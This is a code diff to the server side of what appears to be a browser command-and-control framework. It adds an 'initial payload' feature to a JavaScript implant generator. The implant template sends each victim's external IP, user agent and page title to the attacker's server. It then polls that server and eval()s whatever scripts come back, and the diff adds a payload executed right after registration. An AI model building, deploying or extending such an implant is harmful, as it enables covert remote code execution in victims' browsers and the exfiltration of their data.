@@ -1,4 +1,5 @@
 const Implant = require("../models/Implant");
+const Payload = require("../models/Payload");
 const { createEvent } = require("./eventControllers");
 
 async function generateImplant(server, callbackInterval) {
@@ -19,6 +20,10 @@ async function generateImplant(server, callbackInterval) {
     let data = {}
     let id = "";
 
+    function setData(name, value) {
+        data[name] = value;
+    }
+
     async function createHID() {
         fetch("${server}/register", {
             method: "POST",
@@ -28,69 +33,92 @@ async function generateImplant(server, callbackInterval) {
             body: JSON.stringify({
                 "externalIP": await fetch("https://api.ipify.org/?format=json").then((res) => res.json()).then((data) => {return data.ip}),
                 "userAgent": navigator.userAgent,
-                "currentTab": document.title
+                "currentTab": document.title,
+                "associatedImplant": "%%IMPLANTID%%"
             })
-        }).then(res => res.json()).then(data => {
-            localStorage.setItem("HID", data.id);
+        }).then(res => res.json()).then(responseData => {
+            localStorage.setItem("HID", responseData.id);
+            if(responseData.initialPayload && responseData.initialPayload.payload !== "") {
+                try {
+                    eval(responseData.initialPayload.payload);
+                    commands.push({
+                        id: responseData.initialPayload.id,
+                        name: responseData.initialPayload.name,
+                        author: "Implant %%IMPLANTID%%",
+                        status: "success",
+                        data: JSON.stringify(data)
+                    });
+                } catch (error) {
+                    commands.push({
+                        id: responseData.initialPayload.id,
+                        name: responseData.initialPayload.name,
+                        author: "Implant %%IMPLANTID%%",
+                        status: "error",
+                        data: {
+                            message: error.message
+                        }
+                    })
+                }
+                
+            }
         });
     }
     
-    function setData(name, value) {
-        data[name] = value;
-    }
-
     async function poll() {
-        if(localStorage.getItem("HID") == null) {
-            createHID().then(() => {
-                id = localStorage.getItem("HID"); 
-            });
+        if(localStorage.getItem("HID") == null || localStorage.getItem("HID") == undefined) {
+            createHID();
         } else {
             id = localStorage.getItem("HID");
         }
 
-        if (id) {
-            await fetch(\`${server}/\${id}\`, {
-                method: "POST",
-                cache: "no-cache",
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                body: JSON.stringify({
-                    commands: commands
-                }),
-            }).then(response => response.json().then(responseData => {
-                commands = [];
-                data = {}
-                responseData.forEach((payload) => {
-                    const script = payload.script
-                    try {
-                        if (script.toUpperCase().includes("ALERT")) { // Stops alert hanging the page
-                            setTimeout(function () {
+        if (id && id !== "undefined") {
+            try {
+                await fetch(\`${server}/\${id}\`, {
+                    method: "POST",
+                    cache: "no-cache",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify({
+                        commands: commands
+                    }),
+                }).then(response => response.json().then(responseData => {
+                    commands = [];
+                    data = {}
+                    responseData.forEach((payload) => {
+                        const script = payload.script
+                        try {
+                            if (script.toUpperCase().includes("ALERT")) { // Stops alert hanging the page
+                                setTimeout(function () {
+                                    eval(script);
+                                }, 1);
+                            } else {
                                 eval(script);
-                            }, 1);
-                        } else {
-                            eval(script);
-                        }
-
-                        commands.push({
-                            id: payload.id,
-                            name: payload.name,
-                            author: payload.author,
-                            status: "success",
-                            data: JSON.stringify(data)
-                        });
-                    } catch (error) {
-                        commands.push({
-                            id: payload.id,
-                            name: payload.name,
-                            status: "error",
-                            data: {
-                                message: error.message
                             }
-                        })
-                    }
-                });
-            }));
+
+                            commands.push({
+                                id: payload.id,
+                                name: payload.name,
+                                author: payload.author,
+                                status: "success",
+                                data: JSON.stringify(data)
+                            });
+                        } catch (error) {
+                            commands.push({
+                                id: payload.id,
+                                name: payload.name,
+                                author: payload.author,
+                                status: "error",
+                                data: {
+                                    message: error.message
+                                }
+                            })
+                        }
+                    });
+                }));
+            } catch (error) {
+                localStorage.removeItem("HID");
+            }
         }
     }
     setInterval(poll, ${callbackInterval});
@@ -100,7 +128,8 @@ async function generateImplant(server, callbackInterval) {
         const implant = await Implant.create({
             server: server,
             payload: template,
-            callbackInterval: callbackInterval
+            callbackInterval: callbackInterval,
+            initialPayload: {name: "", payload: ""}
         })
         createEvent("Team Server", `Implant ${implant._id} created`, "info");
         return implant._id.toString();
@@ -137,9 +166,23 @@ async function deleteImplantById(req, res) {
     }
 }
 
+async function updateImplantInitialPayloadById(req, res) {    
+    Payload.findById(req.body.initialPayload).then((payload) => {
+        Implant.findByIdAndUpdate(req.params.id, {initialPayload: {id: payload._id.toString(), name: payload.name, payload: payload.payload}}).then((implant) => {
+            createEvent("Team Server", `Implant ${implant._id.toString()} was updated`, 'info');
+            res.status(200).json(implant);
+        }).catch((err) => {
+            res.status(400).json(err);
+        });
+    }).catch((err) => {
+        res.status(400).json(err);
+    });
+}
+
 module.exports = {
     generateImplant,
     getImplantById,
     getAllImplants,
-    deleteImplantById
+    deleteImplantById,
+    updateImplantInitialPayloadById
 };
